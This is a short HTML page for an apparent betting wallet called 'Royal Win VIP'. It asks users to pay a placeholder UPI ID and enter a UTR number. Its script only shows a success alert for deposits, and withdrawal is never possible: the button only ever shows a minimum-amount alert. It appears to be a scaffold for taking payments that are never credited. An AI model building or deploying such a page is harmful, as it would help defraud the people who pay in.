<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Royal Win VIP</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
        body { background: #0f172a; color: #fff; text-align: center; padding: 20px; }
        header { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 22px; font-weight: bold; color: #facc15; border: 1px solid #eab308; }
        .card { background: #1e293b; padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #334155; }
        .balance { font-size: 26px; color: #4ade80; margin-top: 5px; font-weight: bold; }
        .btn { background: #2563eb; color: #fff; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 10px 5px; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); align-items: center; justify-content: center; }
        .modal-content { background: #1e293b; padding: 25px; border-radius: 12px; width: 90%; max-width: 350px; text-align: center; position: relative; border: 1px solid #38bdf8; }
        input { width: 100%; padding: 12px; margin: 12px 0; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: #fff; font-size: 14px; text-align: center; }
        .close { position: absolute; top: 10px; right: 15px; font-size: 22px; cursor: pointer; color: #94a3b8; }
    </style>
</head>
<body>

    <header>👑 Royal Win VIP</header>

    <div class="card">
        <div>Available Balance</div>
        <div class="balance">₹<span id="userBalance">0.00</span></div>
        <button class="btn" onclick="openModal('depositModal')">+ Deposit</button>
        <button class="btn" style="background:#dc2626;" onclick="alert('Minimum withdrawal amount is ₹110')">Withdraw</button>
    </div>

    <!-- Deposit Modal -->
    <div id="depositModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('depositModal')">&times;</span>
            <h3 style="color:#38bdf8; margin-bottom:10px;">Deposit Wallet</h3>
            <p style="font-size:13px; color:#94a3b8;">Pay via UPI & submit 12-Digit UTR Number</p>
            
            <div style="background:#0f172a; padding:12px; border-radius:8px; margin:15px 0; border:1px dashed #facc15;">
                <p style="font-size:12px; color:#94a3b8;">Pay to UPI ID:</p>
                <b style="color:#facc15; font-size:16px;">YOUR_UPI_HERE@paytm</b>
            </div>

            <input type="number" id="utrInput" placeholder="Enter 12-Digit UTR / Ref No.">
            <button class="btn" style="width:100%; background:#22c55e;" onclick="submitDeposit()">Submit Deposit</button>
        </div>
    </div>

    <script>
        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
        
        function submitDeposit() {
            let utr = document.getElementById('utrInput').value;
            if(utr.length < 10) {
                alert('Please enter a valid 12-digit UTR Number');
                return;
            }
            alert('Deposit Request Submitted Successfully!');
            closeModal('depositModal');
            document.getElementById('utrInput').value = '';
        }
    </script>
</body>
</html>
